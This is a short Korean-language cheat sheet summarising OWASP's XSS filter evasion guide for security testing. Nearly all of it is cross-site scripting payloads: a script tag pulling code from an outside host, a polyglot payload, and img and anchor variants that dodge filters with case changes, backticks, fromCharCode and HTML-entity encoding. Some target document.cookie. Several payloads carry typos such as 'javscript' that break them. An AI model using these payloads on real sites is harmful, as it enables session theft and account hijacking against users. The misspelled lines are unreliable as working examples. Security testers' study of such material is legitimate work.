## XSS Filter Evasion Cheat Sheet

---

본문은 어플리케이션 보안 테스트 중 `Cross-Site Script`취약점에 대한 가이드를 제공한다.

[XSS-Filter-Evasion-Cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet#)





## Basic XSS Test Without Filter Evasion

>아래 구문은 일반적인 `XSS` 자바스크립트 인젝션 구문이다, 또한 대부분이 막혀있으나 제일 먼저 이를 시도할것을 추천한다.
>
>cf) 모던웹에서는 따옴표를 쓰지 않아도 무방하다.
>
>```html
><script src=https:xxx.com></script>
>```
>
>



## XSS Locator (Polygot)

---

> 본 구문은 "polygot test XSS payload"내용이다.
>
> 해당 구문은 `html`, `script 문자열`, `javascript`, `url`등 다양한 컨텍스트에서 모두 사용될 수 있다.
>
> ```html
> javscript:/*--></title></style></textarea></sript></xmp>
> <svg/onload='+/"+/onmouseover=1/+/[*/[]/+alert(1)//'>
> ```



## Cheat Sheet

---

>**img 태그를 이용한 XSS**
>
>```html
><!-- img 태그를 이용한 XSS -->
><img src="javscript:alert('XSS')">
>
><!-- Quotes & Semicolon을 쓰지 않는 XSS -->
><img src=javscript:alert('XSS')>
>
><!-- 대소문자 필터링 XSS Attack vector -->
><img src=JaVaScRiPt:alert('XSS')>
>
><!-- HTML 엔터티를 이용한 XSS -->
><img src=javscript:alert(&quot;XSS&quot;)> 
>
><!-- 약한 강조를 이용한 난독화 XSS -->
><img src=`javacsript:alert('XSS')`>
>만일 쌍따옴표 또는 홑따옴표를 써야하는 경우에는 grave accent를 이용하여 자바스크립트 문자열을 인캡슐래이션 가능.
>-> 대부분의 XSS 필터들이 이걸 모르기 때문에 매우매우 유용함 
>
><!-- a 태그 변형 XSS -->
>\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
>`href` 특성을 skip하여 XXS실행 가능
>
><!-- img 태그 변형 XSS-->
><IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
>본 구문은 HTML태그 파싱을 매우 어렵게 만듬
>    
><!-- fromCharCode 응용 XSS-->
><IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
>어떠한 따옴표도 이용이 불가능한 경우, fromCharCode를 통해 문자열 생성 가능 -> document.cookie같은것.
>    
><!--SRC 도메인을 확인하는 필터를 통과하기 위한 기본 SRC 태그 -->
><IMG SRC=# onmouseover="alert('xxs')">
>본 구문은 대표적인 도메인 필터링을 우회할 수 있다. onmouseover 이벤트 대신 onblur, onclick과 같은 이벤트 또한 사용이 가능하다.
>    
><!-- 기본 SRC 비우기 -->
><IMG SRC= onmouseover="alert('xxs')">
>    
><!-- 의도적 에러 유발을 통한 XSS -->
><IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
>
><!-- IMG 에러 & 경고창 띄우기 인코딩 버전 -->
><img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
>```
>
>